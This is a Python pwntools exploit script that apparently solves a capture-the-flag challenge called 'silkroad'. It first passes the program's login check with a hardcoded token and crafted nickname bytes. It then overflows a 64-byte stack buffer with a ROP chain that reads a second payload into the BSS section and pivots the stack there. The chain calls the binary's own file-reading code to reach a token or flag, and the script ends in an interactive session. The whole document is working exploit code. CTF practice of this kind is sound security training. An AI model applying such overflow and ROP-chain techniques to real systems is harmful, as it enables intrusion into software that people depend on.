from pwn import *
from time import sleep

local = True
attach_gdb = False
if local:
	DELAY = 0.1
else:
	DELAY = 0.5

if local:
	p = process('./silkroad.elf')
else:
	p = remote('82.196.10.106', 58399)

if local and attach_gdb:
	gdb.attach(p, '''
		break *0x401861
		break *0x4017ce
		break *0x401811
		break *0x4018a6
		break *0x40193f
		break *0x4012c3
		break *0x401352
		break *0x4013c9
		break *0x40182a
		break *0x401382
		continue
		''')
	# 2b7: printf leak
	# 401861: 
	# 4018be: after fgets
	# 4017ce: read silkroad token. Ghidra beats Ida today.
	# 4018a6: fgets.
	# 40193f: start of main
	# 4012c3: printf vulnerability
	# 401352: call read
	# 4013c9: after call to read
	# 40182a: read file address
	# 401382: while reading flag from file


BSS_ROOT = 0x404400 # was 0x404700
NEW_RBP = BSS_ROOT + 0x100
NEW_RSP = BSS_ROOT + 0x100
LEAVE_ADDR = 0x401298
MAIN_ADDR = 0x40193f
RET_ADDR = 0x401016
READ_SILKROAD_TOKEN_ADDR = 0x4017ce
POP_RDI = 0x401bab
FGETS_ADDR = 0x4018a6
SILKROAD_ADDR = 0x4047c0
FILE_CONTENTS_ADDR = 0x404600
READ_FILE_ADDR = 0x40182a
POP_RSI = 0x401ba9 # pop rsi; pop r15; ret
STDIN_PTR_ADDR = 0x4040d0
LEAK_ADDR = 0x40129a # was 2c3
STACK_PTR_ADDR = 0x404070 # the time, stored in the GOT
CALL_READ_ADDR = 0x401352
PRINT_FLAG_ADDR = 0x401232
CALL_PUTS_ADDR = 0x401964

def get_to_silkroad():
	p.send('790317143\n')
	sleep(DELAY)
	p.recvuntil("nick: ")
	# 20-22 have to be 0x7a69
	p.send("DreadPirateRoberts!\x69\x7a\x00")
	sleep(DELAY)
	p.recvuntil("Silkroad!\n")

## Get to the buffer overflow
get_to_silkroad()

## Fill the initial buffer (64 bytes long)
payload = ""
for i in range(8):
	payload += chr(0x41+i)*8
# 0x404500: the second call to leave after the second read will pivot the ROP chain 
# to this address + 0x8.
payload += p64(NEW_RBP) 
payload += p64(0x4017ce) # Puts 0x1ed60 in rdx
payload += p64(POP_RSI)
payload += p64(BSS_ROOT) # where I'm reading into 
payload += p64(0x0)
payload += p64(POP_RDI)
payload += p64(0x0) # Read from stdin
payload += p64(CALL_READ_ADDR)
payload += "\n"
p.send(payload)
sleep(DELAY)

#### payload 2: write to the BSS section!
#
STACK_PIVOT_RBP = BSS_ROOT + 0x300
FAKE_FILE_STRING_LOCATION = BSS_ROOT + 0x400
# Giving myself lots of room to grow the stack down before overwriting my ROP chain
payload2 = ""
payload2 += p64(0x0) # 8
payload2 += "A"*(0x40-8)
payload2 += p64(BSS_ROOT+8) # pointer to null at RBP-0xc0
for i in range(20):
	payload2 += chr(0x41+i)*8 # initial filler space
payload2 += p64(BSS_ROOT) # Now this points to null
payload2 += chr(0x56)*8
payload2 += p32(0x0)
payload2 += p32(0x1)
payload2 += p64(STACK_PIVOT_RBP)
# Next comes the continuation of my ROP chain after the stack pivot
payload2 += p64(RET_ADDR)
payload2 += p64(POP_RDI)
# Guess I'll read the file contents into base + 0x400 (0x404800)
payload2 += p64(FAKE_FILE_STRING_LOCATION) 
payload2 += p64(READ_SILKROAD_TOKEN_ADDR)
#
for i in range(91): # (0x600 / 8) - 16
	payload2 += chr((0x41+i)%256)*8
# Okay, now we're at FAKE_FILE_STRING_LOCATION
payload2 += "790317143\x00"
payload2 += "\n"
p.send(payload2)

# Profit
p.interactive()